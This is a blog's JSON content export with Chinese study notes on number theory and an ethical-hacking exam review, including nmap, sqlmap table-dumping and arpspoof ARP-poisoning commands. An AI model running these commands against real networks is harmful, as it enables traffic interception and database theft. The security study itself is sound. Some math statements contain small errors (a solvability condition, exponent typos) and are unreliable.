{"meta":{"title":"Keter's Blog","subtitle":"","description":"","author":"Keter","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2020-11-16T12:44:23.239Z","updated":"2020-10-29T03:27:45.646Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-12-06T02:50:01.570Z","updated":"2020-10-29T03:28:43.873Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"player","date":"2020-12-06T03:11:37.513Z","updated":"2020-12-06T03:03:06.997Z","comments":true,"path":"player/index.html","permalink":"http://example.com/player/index.html","excerpt":"","text":"console.error(\"Error: [hexo-tag-aplayer] Meting support is disabled, cannot resolve the meting tags properly.\");"},{"title":"tags","date":"2020-11-16T12:44:23.238Z","updated":"2020-10-29T03:28:23.733Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"【信息安全数学基础】二次同余式与平方剩余","slug":"【信息安全数学基础】二次同余式与平方剩余","date":"2020-12-10T11:42:31.000Z","updated":"2020-12-23T13:18:14.000Z","comments":true,"path":"2020/12/10/【信息安全数学基础】二次同余式与平方剩余/","link":"","permalink":"http://example.com/2020/12/10/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91%E4%BA%8C%E6%AC%A1%E5%90%8C%E4%BD%99%E5%BC%8F%E4%B8%8E%E5%B9%B3%E6%96%B9%E5%89%A9%E4%BD%99/","excerpt":"","text":"¶平方剩余(二次剩余) （a，m）= 1，x2≡ a mod mx^2\\equiv \\ a\\ mod\\ mx2≡ a mod m有解，则a叫模m的平方剩余；P125 ¶欧拉判别定理 如何快速的判断某个数是否是模p的平方剩余； x2≡ a mod px^2\\equiv\\ a\\ mod\\ px2≡ a mod p 且（a，p）= 1，p ！=2，如若ap−12≡ 1 mod pa^{\\frac{p-1}{2} }\\equiv\\ 1\\ mod\\ pa2p−1​≡ 1 mod p,（等价）则a是模p的平方剩余，且x有两个解，反之，对于ap−12≡ −1 mod pa^{\\frac{p-1}{2} }\\equiv\\ -1\\ mod\\ pa2p−1​≡ −1 mod p，（等价）则a是模p的平方非剩余 P129 ¶Legendre（勒让德） 用于帮忙判断同余式是否有解 对于同余式：x2≡a(mod p)x^2 \\equiv a(mod \\ p)x2≡a(mod p); (ap)={1,若a是模p的平方剩余−1,若a是模p的平方非剩余0,若p|a\\left(\\frac{a}{p}\\right)=\\begin{cases}1,&amp;\\text{若a是模p的平方剩余}\\\\-1,&amp;{若a是模p的平方非剩余}\\\\0,&amp;\\text{若p|a}\\end{cases} (pa​)=⎩⎪⎪⎨⎪⎪⎧​1,−1,0,​若a是模p的平方剩余若a是模p的平方非剩余若p|a​ 如果p是奇素数，那么还有如下的性质： (1p)=1\\left(\\frac{1}{p}\\right)=1 (p1​)=1 (−1p)=(−1)p−12\\left(\\frac{-1}{p}\\right)=(-1)^{\\frac{p-1}{2}} (p−1​)=(−1)2p−1​ (2p)=(−1)p2−18\\left(\\frac{2}{p}\\right)=(-1)^{\\frac{p^2-1}{8}} (p2​)=(−1)8p2−1​ 一些运算性质： ( i ) (a+pp)=(ap)\\left(\\frac{a+p}{p}\\right) = \\left(\\frac{a}{p}\\right)(pa+p​)=(pa​) 周期性 ( ii ) (a⋅bp)=(ap)(bp)\\left(\\frac{a \\cdot b}{p}\\right) = \\left(\\frac{a}{p}\\right)\\left(\\frac{b}{p}\\right)(pa⋅b​)=(pa​)(pb​) ¶勒让德符号的性质： 周期性：(a+pp)=(ap)\\left(\\frac{a+p}{p}\\right)=\\left(\\frac{a}{p}\\right)(pa+p​)=(pa​) 完全可乘性：(a∗bp)=(ap)∗(bp)\\left(\\frac{a*b}{p}\\right)=\\left(\\frac{a}{p}\\right)*\\left(\\frac{b}{p}\\right)(pa∗b​)=(pa​)∗(pb​) (a2p)=1,(a,p)=1\\left(\\frac{a^2}{p}\\right)=1,(a,p)=1(pa2​)=1,(a,p)=1 ¶高斯引理(不用记）：p是奇素数，a是整数，（a，p）=1，如果整数a1，a2，…a*（p-1）/2中模p的最小正剩余大于p/2的个数是m，则有(ap)=(−1)m\\left(\\frac{a}{p}\\right)=(-1)^m(pa​)=(−1)m P134 ¶超级重要的二次互反律 p,q是互素的奇素数，则(pq)=(−1)p−12∗q−12(qp)\\left(\\frac{p}{q}\\right)=(-1)^{\\frac{p-1}{2}*\\frac{q-1}{2}}\\left(\\frac{q}{p}\\right)(qp​)=(−1)2p−1​∗2q−1​(pq​) P137 ¶雅克比符号 勒让德符号的扩展，(am)=(ap1)...(apr)\\left(\\frac{a}{m}\\right)=\\left(\\frac{a}{p_1}\\right)...\\left(\\frac{a}{p_r}\\right)(ma​)=(p1​a​)...(pr​a​),m=p1...prm=p_1...p_rm=p1​...pr​是奇素数的乘积。二次同余式x2≡ a mod mx^2\\equiv\\ a\\ mod\\ mx2≡ a mod m有解可以(单向)推出(am)=1\\left(\\frac{a}{m}\\right)=1(ma​)=1，(am)=−1\\left(\\frac{a}{m}\\right)=-1(ma​)=−1可以（单向）推出无解；P143 雅克比符号性质与勒让德符号一致 P143 二次互反也一样，只是p，q必须是奇数； 一些与雅克比有关的重要式子：也是和勒让德一样，只要限制条件是p不在局限于奇素数，而是奇数 P144 (1m)=1\\left(\\frac{1}{m}\\right)=1 (m1​)=1 (−1m)=(−1)m−12\\left(\\frac{-1}{m}\\right)=(-1)^{\\frac{m-1}{2}} (m−1​)=(−1)2m−1​ (2m)=(−1)m2−18\\left(\\frac{2}{m}\\right)=(-1)^{\\frac{m^2-1}{8}} (m2​)=(−1)8m2−1​ 雅可比和勒让德一些不同的点： . 雅可比中上单向的箭头，这里是需要注意一下的 下面放一个大致整理图来的图：","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【白帽子学习笔记】加油NPT","slug":"【白帽子学习笔记】加油NPT","date":"2020-12-06T13:03:30.000Z","updated":"2020-12-14T03:51:20.770Z","comments":true,"path":"2020/12/06/【白帽子学习笔记】加油NPT/","link":"","permalink":"http://example.com/2020/12/06/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%8A%A0%E6%B2%B9NPT/","excerpt":"【白帽子学习笔记】加油NPT 考试复习内容，看到这篇博客的小伙伴要加油啊！冲冲冲！ ¶0x01 PETS标准 整个渗透测试过程大致可以分为7个阶段： 前期与客户的交流阶段：确认是对目标的哪些设备和哪些问题进行测试，商讨过程中的主要因素有如下几个： 渗透测试的目标 进行渗透测试所需要的条件 渗透测试过程中的限制条件 渗透测试过程的工期 渗透测试费用 渗透测试过程的预期目标 情报的收集阶段：使用各种资源尽可能地获得要测试目标的相关信息 被动扫描 主动扫描 威胁建模阶段：这个阶段主要解释了如下的问题 哪些资产所目标中的重要资产 攻击时采用的技术和手段 哪些群里可能会对目标系统造成攻击 这些群体会使用哪些方法进行破坏 漏洞分析阶段 漏洞利用阶段 后渗透攻击阶段：尽可能地将目标被渗透后所可能产生的后果模拟出来，来给客户展示当前网络存在的问题会带来的风险 控制权限的提升 登录凭证的窃取 重要信息的获取 利用目标作为跳板 建立长期的控制通道 报告阶段","text":"【白帽子学习笔记】加油NPT 考试复习内容，看到这篇博客的小伙伴要加油啊！冲冲冲！ ¶0x01 PETS标准 整个渗透测试过程大致可以分为7个阶段： 前期与客户的交流阶段：确认是对目标的哪些设备和哪些问题进行测试，商讨过程中的主要因素有如下几个： 渗透测试的目标 进行渗透测试所需要的条件 渗透测试过程中的限制条件 渗透测试过程的工期 渗透测试费用 渗透测试过程的预期目标 情报的收集阶段：使用各种资源尽可能地获得要测试目标的相关信息 被动扫描 主动扫描 威胁建模阶段：这个阶段主要解释了如下的问题 哪些资产所目标中的重要资产 攻击时采用的技术和手段 哪些群里可能会对目标系统造成攻击 这些群体会使用哪些方法进行破坏 漏洞分析阶段 漏洞利用阶段 后渗透攻击阶段：尽可能地将目标被渗透后所可能产生的后果模拟出来，来给客户展示当前网络存在的问题会带来的风险 控制权限的提升 登录凭证的窃取 重要信息的获取 利用目标作为跳板 建立长期的控制通道 报告阶段 ¶0x02 ethical hacking的意义 ¶0x03 Kali基础 ¶1x01 NAT和桥接的区别 桥接模式：在桥接模式下，VMWare虚拟出来的操作系统就像是局域网中的一台独立的主机（主机和虚拟机处于对等地位），它可以访问网内任何一台机器。在桥接模式下，我们往往需要为虚拟主机配置ＩＰ地址、子网掩码等（注意虚拟主机的iｐ地址要和主机ｉｐ地址在同一网段）。使用桥接模式的虚拟系统和主机的关系，就如同连接在一个集线器上的两台电脑；要让他们通讯就需要为虚拟系统配置ip地址和子网掩码。如果我们需要在局域网内建立一个虚拟服务器，并为局域网用户提供服务，那就要选择桥接模式。 NAT：是Network Address Translation的缩写，意即网络地址转换。使用NAT模式虚拟系统可把物理主机作为路由器访问互联网，NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信**。虚拟机向外部网络发送的请求数据’包裹’，都会交由NAT网络适配器加上’特殊标记’并以主机的名义转发出去**，外部网络返回的响应数据’包裹’，也是先由主机接收，然后交由NAT网络适配器根据’特殊标记’进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。**从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。**此外，在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的。 ¶1x02 基本操作 ifconfig：查看IP信息 netstat -r：查看网关 如何判断两台主机时候在同一网段？ 将两台主机的IP分别与子网掩码进行与运算，比较运算结果是否相同； ¶0x04 被动扫描 ¶1x01 什么是被动扫描？ 主要指的是在目标无法察觉的情况下进行的信息收集 目标网站的所有者信息，例如：姓名、地址、电话、电子邮件等 目标网站的电子邮箱 目标网站的社交信息：QQ、微博、微信、论坛发帖等 ¶1x02 zoomeye ZoomEye是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。 ¶1x03 Google Hacking site ： 指定域名 inurl：url存在关键字的网页 intext：网页正文中的关键字 filetype：指定文件类型 intitle：网页标题中的关键字 ¶0x05 主动扫描 主动扫描的范围要小得多。主动扫描一般都是针对目标发送特制的数据包，然后根据目标的反应来获得一些信息。这些信息主要包括目标主机是否在线、目标主机的指定端口是否开放、目标主机的操作系统、目标主机上运行的服务等。 ¶NMAP的应用 扫描操作系统: nmap -O IP 判断所在网络存活主机： 扫描192.168.0.0/24网段上有哪些主机的存活的 nmap -sP 192.168.0.0/24 扫描主机开放了哪些端口： TCP端口扫描：scan tcp nmap -sT IP UDP端口扫描：scan udp nmap -sU IP 扫描全部端口： nmap-p &quot;*&quot; ip 扫描前n的端口： nmap-top-ports n IP 扫描指定的端口： nmap -P IP 扫描目标开启了哪些服务： nmap -sV IP 将扫描结果保存为xml文件： nmap -oX a.xml IP ¶0x06 身份认证攻击 ¶1x01 BurpSuite 主要需要知道一个作用就是Proxy： 拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 其他常用的功能还有： Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。 Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。 ¶如何设置安全的密码？ 避开若口令 能记住的密码才是好密码 密码中包含数字，大小写英文 增加密码的长度 每个应用的密码都设置的具有一定差异 ¶0x07 网络数据嗅探与欺骗 ¶1x01 如何利于Wireshark恢复数据流中的文件 利用WireShark的包筛选去筛选出需要的包 ==&gt; 跟踪数据流 ==&gt; 找到需要的数据，选择原数据进行保存 常用的WireShark语句： tcp：tcp流； http：http数据流； http.request.method：筛选HTTP数据流的请求方式； ip.src：对于数据源地址进行筛选 ip.dst：对于目的地址筛选 ¶1x02 arpspoof 开启端口转发，允许本机像路由器那样转发数据包 echo 1 &gt; /proc/sys/net/ipv4/ip_forward ARP投毒 arpspoof -i eth0 -t IP1 IP2(IP1是我们的攻击目标、IP2是网关IP地址) -i eth0表示选择eth0这个网卡； ARP攻击原理： 在局域网内的攻击方式主要有两种： . (1) PC1：PC2不断的向PC1发送欺骗包，欺骗其为网关路由，最后导致PC1的ARP表遭到攻击； (2) Route：PC2不断的向Route(网关路由)发送欺骗包，欺骗其为PC1； 因为arp欺骗想把原理写明白需要很大的篇幅，这里就不细说了 ¶0x08 远程控制 ¶1x01 正向连接和反向连接的区别 反向连接：攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接。 正向连接：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入。 ¶1x02 反向连接的实施过程 攻击者先通过某个手段在目标机器上植入恶意代码，并且该代码可以被触法。攻击者设置一个端口和一个IP，当被攻击者执行了恶意代码后攻击者的机器就会获取被攻击者的代码。 ¶0x09 漏洞扫描 ¶1x01 工具们 工具： AWVS：漏洞扫描工具 Beef：XSS漏洞利用工具 SQLMAP：自动话sql注入工具： 查询当前数据库：sqlmap -u &quot;IP&quot; --cookie &quot;xxx&quot; --current-db 查询当前使用者：--current user 爆破数据表：-D xx --tables 爆破数据表表头：-D xx -T xx --columns 爆破具体的列：-D xx -T xx -C xx Whatweb: 查询网页的基本信息 whatweb IP Wpscan:可以扫描WordPress中的多种安全漏洞 Dirb：爆破用 dirb -u http://IP MeterSploit:功能非常强大的渗透工具 ¶1x02 XSS攻击/SQL注入 **XSS攻击：**XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 SQL注入攻击的原理：恶意用户在提交查询请求的过程中将SQL语句插入到请求内容中，同时程序本身对用户输入内容过分信任而未对恶意用户插入的SQL语句进行过滤，导致SQL语句直接被服务端执行。 ¶0x10 OWASP TOP 10 Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently. Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser. XML External Entities (XXE). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks. Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc. Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion. Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. Insecure Deserialization. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks. Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts. Insufficient Logging &amp; Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"","slug":"【信息安全数学基础】同余式","date":"2020-12-06T03:32:21.000Z","updated":"2020-12-11T04:14:58.776Z","comments":true,"path":"2020/12/06/【信息安全数学基础】同余式/","link":"","permalink":"http://example.com/2020/12/06/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91%E5%90%8C%E4%BD%99%E5%BC%8F/","excerpt":"【信息安全数学基础】同余式 可以简单点理解为上一章学习的同余的概念中混入了x（手动滑稽） ¶同余式的基本概念 什么是同余式？ 设m是一个正整数，f（x）为多项式； f(x)=anxn+⋅⋅⋅+a1x+a0f(x) = a_nx^n + \\cdot \\cdot \\cdot +a_1x +a_0 f(x)=an​xn+⋅⋅⋅+a1​x+a0​ 其中ai为a_i为ai​为整数，则： f(x)≡0(mod n)f(x) \\equiv 0(mod \\ n) f(x)≡0(mod n) 叫做模m的同余式，如果an≢0(mod m)a_n \\not\\equiv 0(mod \\ m)an​​≡0(mod m),则n叫做f(x)的次数，记作degf. 如果整数x=a满足： f(a)≡0(mod m)f(a) \\equiv 0(mod \\ m) f(a)≡0(mod m) 则a叫做该同余式的解；x≡a(mod m)x \\equiv a (mod \\ m)x≡a(mod m)的所有整数都使得同余式成立，即a所在的剩余类。 ¶一次同余式🌿 由于1次以上的同余式都太复杂了，所以手算程度上我们主要掌握的是一次同余式； 一次同余式解的存在性判定：🌟 ax≡n(mod m)ax \\equiv n(mod \\ m) ax≡n(mod m) 有解的充分必要条件是(a,m)=n,而且，解是唯一的","text":"【信息安全数学基础】同余式 可以简单点理解为上一章学习的同余的概念中混入了x（手动滑稽） ¶同余式的基本概念 什么是同余式？ 设m是一个正整数，f（x）为多项式； f(x)=anxn+⋅⋅⋅+a1x+a0f(x) = a_nx^n + \\cdot \\cdot \\cdot +a_1x +a_0 f(x)=an​xn+⋅⋅⋅+a1​x+a0​ 其中ai为a_i为ai​为整数，则： f(x)≡0(mod n)f(x) \\equiv 0(mod \\ n) f(x)≡0(mod n) 叫做模m的同余式，如果an≢0(mod m)a_n \\not\\equiv 0(mod \\ m)an​​≡0(mod m),则n叫做f(x)的次数，记作degf. 如果整数x=a满足： f(a)≡0(mod m)f(a) \\equiv 0(mod \\ m) f(a)≡0(mod m) 则a叫做该同余式的解；x≡a(mod m)x \\equiv a (mod \\ m)x≡a(mod m)的所有整数都使得同余式成立，即a所在的剩余类。 ¶一次同余式🌿 由于1次以上的同余式都太复杂了，所以手算程度上我们主要掌握的是一次同余式； 一次同余式解的存在性判定：🌟 ax≡n(mod m)ax \\equiv n(mod \\ m) ax≡n(mod m) 有解的充分必要条件是(a,m)=n,而且，解是唯一的 模m的可逆元 设m是一个正整数，a是一个整数，如果整数a‘存在使得： a⋅a′≡a′⋅a≡1(mod m)a \\cdot a&#x27; \\equiv a&#x27; \\cdot a \\equiv 1 (mod \\ m) a⋅a′≡a′⋅a≡1(mod m) 成立，则a叫做模m的可逆元； 模m的同余的求解：🌟 第一步：均是判断解的存在性，存在之后再去进行下一步的求解，运用到上面那一个问题的解答； 对于一次同余式ax≡1 mod max \\equiv 1 \\ mod \\ max≡1 mod m类型，一定有s⋅a+t⋅m=1s \\cdot a + t \\cdot m = 1s⋅a+t⋅m=1而x=s mod mx = s \\ mod \\ mx=s mod m就是解，且具有唯一性； P92 一次同余式一般式ax≡b mod max \\equiv b \\ mod \\ max≡b mod m的求解，首先对于式子进行化简，每个数均除以（a，m），得到a1x≡b1 mod m1a_1x \\equiv b_1 \\ mod \\ m_1a1​x≡b1​ mod m1​,再求出特殊式a1x′≡1 mod m1a_1x&#x27; \\equiv 1 \\ mod \\ m_1a1​x′≡1 mod m1​的特解x′x&#x27;x′,然后写出同余式a1x≡b1 mod m1a_1x \\equiv b_1 \\ mod \\ m_1a1​x≡b1​ mod m1​，直接可以得到的一个特解就是x0≡b1⋅x′ mod m1x_0 \\equiv b_1 \\cdot x&#x27; \\ mod \\ m_1x0​≡b1​⋅x′ mod m1​; P94 一道例题： 求解一次同余式 33x=22(mod 77)33x = 22(mod \\ 77) 33x=22(mod 77) 解：首先计算（33.77）= 11 ｜22，所以该同余式有解； 接下来对上述同余式同时除以11，可以得到： 3x=2(mod 7)3x = 2(mod \\ 7) 3x=2(mod 7) 把2用1来替换可以得到： 3x=1(mod 7)3x=1(mod \\ 7) 3x=1(mod 7) 很容易可以求得特殊解：x0′=5x_0&#x27; = 5x0′​=5 再次写出： 3x=2(mod 7)3x = 2(mod \\ 7) 3x=2(mod 7) 的一个特解是x0≡2⋅x0′≡2⋅5≡3(mod 7)x_0 \\equiv 2 \\cdot x_0&#x27; \\equiv 2 \\cdot 5 \\equiv 3 (mod \\ 7)x0​≡2⋅x0′​≡2⋅5≡3(mod 7) 最后可以写出同余式的解： x=3+t⋅7(mod 77),t=0,1,2⋅⋅⋅⋅x = 3+t \\cdot 7(mod \\ 77),t=0,1,2 \\cdot \\cdot \\cdot \\cdot x=3+t⋅7(mod 77),t=0,1,2⋅⋅⋅⋅ 注意这里的为模77 ¶中国剩余定理 🌿 用于求解同余式组 P97 设m1,m2,⋅⋅⋅m_1,m_2,\\cdot \\cdot \\cdotm1​,m2​,⋅⋅⋅ 是k个两两互素的正整数，则对任意的整数$b_1,b_2, \\cdot \\cdot \\cdot ,b_k $同余式组： {x≡(mod m1)...x≡(mod mk)\\begin{cases} x \\equiv (mod \\ m_1) \\\\ ...\\\\ x \\equiv (mod \\ m_k) \\\\ \\end{cases} ⎩⎪⎪⎨⎪⎪⎧​x≡(mod m1​)...x≡(mod mk​)​ 一定有解，且解是唯一的； 若令： m=m1⋅⋅⋅mk,m=mi⋅Mi,i=1,⋅⋅⋅,km=m_1 \\cdot \\cdot \\cdot m_k,m = m_i \\cdot M_i, i=1, \\cdot \\cdot \\cdot,k m=m1​⋅⋅⋅mk​,m=mi​⋅Mi​,i=1,⋅⋅⋅,k 则同余式组的解可表示为 x≡b1⋅M1′⋅M1+b2⋅M2′⋅M2+⋅⋅⋅+bk⋅Mk′⋅Mk(mod m)x \\equiv b_1 \\cdot M_1&#x27; \\cdot M_1 + b_2 \\cdot M_2&#x27; \\cdot M_2 + \\cdot \\cdot \\cdot + b_k \\cdot M_k&#x27; \\cdot M_k(mod \\ m) x≡b1​⋅M1′​⋅M1​+b2​⋅M2′​⋅M2​+⋅⋅⋅+bk​⋅Mk′​⋅Mk​(mod m) 其中 Mi′⋅Mi≡1(mod mi),i=1,2,⋅⋅⋅,kM_i&#x27; \\cdot M_i \\equiv 1 (mod \\ m_i), i=1,2,\\cdot \\cdot \\cdot,k Mi′​⋅Mi​≡1(mod mi​),i=1,2,⋅⋅⋅,k ¶中国剩余定理的应用 ==》 一些例题 计算21000000(mod 77)2^{1000000}(mod \\ 77)21000000(mod 77) 解：令x = 210000002^{1000000}21000000 . 因为 77 = 11 * 7 ，所以计算x mod 77 可以等价于求解两个同余式： {x≡b1 (mod 11)x≡b2 (mod 7)\\begin{cases} x \\equiv b1 \\ (mod \\ 11) \\\\ x \\equiv b2 \\ (mod \\ 7) \\\\ \\end{cases} {x≡b1 (mod 11)x≡b2 (mod 7)​ 由Euler定理可得： 2ϕ(11)≡210≡1(mod 11)2^{\\phi(11)} \\equiv 2^{10} \\equiv 1 (mod \\ 11)2ϕ(11)≡210≡1(mod 11) 那么就可以得到： x≡(210)100000≡1(mod 11)x \\equiv (2^{10})^{100000} \\equiv 1 (mod \\ 11)x≡(210)100000≡1(mod 11) 则 b1 = 1 同理有: x≡(26)166666⋅24≡2(mod 7)x \\equiv (2^{6})^{166666} \\cdot 2^4 \\equiv 2 (mod \\ 7)x≡(26)166666⋅24≡2(mod 7), 则b2 = 2 令m2 = 11 , m1 = 7，则 m = 11 * 7 = 77. M1=m2=11,M2=m1=7M_1 = m_2 = 11,M_2 = m_1 = 7 M1​=m2​=11,M2​=m1​=7 可以得到： 11M1′≡2(mod 7)7M2′≡8(mod 11)11M_1&#x27; \\equiv 2(mod \\ 7)\\\\ 7M_2&#x27; \\equiv 8 (mod \\ 11) 11M1′​≡2(mod 7)7M2′​≡8(mod 11) 最后可以得到结果： x≡2⋅11⋅2+1⋅8⋅7 (mod 77)x≡23 (mod 77)x \\equiv 2 \\cdot 11 \\cdot 2 + 1 \\cdot 8 \\cdot 7 \\ (mod \\ 77) \\\\ x \\equiv 23 \\ (mod \\ 77) x≡2⋅11⋅2+1⋅8⋅7 (mod 77)x≡23 (mod 77) 计算 31213(mod 667)312^{13}(mod \\ 667)31213(mod 667) （中国剩余定理和模重复平方法的结合） 解：令x = 31213312^{13}31213, 667 = 23 * 29 则同余式可以化为： {x≡b1 (mod 23)x≡b2 (mod 29)\\begin{cases} x \\equiv b1 \\ (mod \\ 23) \\\\ x \\equiv b2 \\ (mod \\ 29) \\\\ \\end{cases} {x≡b1 (mod 23)x≡b2 (mod 29)​ 由模重复平方法可得：b1≡31313≡8(mod 23)b1 \\equiv 313^{13} \\equiv 8(mod \\ 23)b1≡31313≡8(mod 23),b2≡31212≡4(mod 29)b2 \\equiv 312^{12} \\equiv 4 (mod \\ 29)b2≡31212≡4(mod 29); 令m1 = 23；m2 = 29： 则M1 = 29，M2 = 23； 可以得到： 29M1′≡1(mod 23)23M2′≡1(mod 29)29M_1&#x27; \\equiv 1(mod \\ 23)\\\\ 23M_2&#x27; \\equiv 1(mod \\ 29) 29M1′​≡1(mod 23)23M2′​≡1(mod 29) 解得：M1′=4M_1&#x27; = 4M1′​=4,M2′=−5M_2&#x27; = -5M2′​=−5 x≡8⋅4⋅29+4⋅(−5)⋅23(mod 667)≡468(mod 667)x \\equiv 8 \\cdot 4 \\cdot 29 + 4 \\cdot (-5) \\cdot 23 (mod \\ 667) \\equiv 468 (mod \\ 667) x≡8⋅4⋅29+4⋅(−5)⋅23(mod 667)≡468(mod 667)","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【白帽子学习笔记】CTF实践","slug":"【白帽子学习笔记】CTF实践","date":"2020-12-05T15:42:04.000Z","updated":"2020-12-19T05:20:03.722Z","comments":true,"path":"2020/12/05/【白帽子学习笔记】CTF实践/","link":"","permalink":"http://example.com/2020/12/05/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91CTF%E5%AE%9E%E8%B7%B5/","excerpt":"【白帽子学习笔记】CTF实践 ¶0x01 实验知识点 ¶1x01 什么是CTF？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 ¶1x02 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 